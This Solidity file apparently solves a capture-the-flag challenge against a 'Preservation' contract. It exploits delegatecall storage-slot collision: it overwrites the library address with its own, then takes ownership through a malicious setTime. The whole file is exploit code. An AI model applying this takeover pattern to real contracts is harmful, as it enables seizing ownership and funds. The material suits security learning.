// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Preservation.sol";
contract Attack {

  // stores a timestamp 
  uint storedTime; 
  address public timeZone2Library;
  address public owner;
  Preservation public preservation;
  
  constructor(address _preservationAddr){
    owner=msg.sender;
    preservation=Preservation(_preservationAddr);
  }  
  
  function setTime(uint256 _time) public {
     owner=tx.origin;
  }

  function attack() external{
     //type cast uint into address and transfer the value into owner;
     uint time=uint(uint160(address(this)));
     preservation.setSecondTime{gas:500000}(time);
  }

  function attack2()external{
    preservation.setFirstTime(1);
  }
}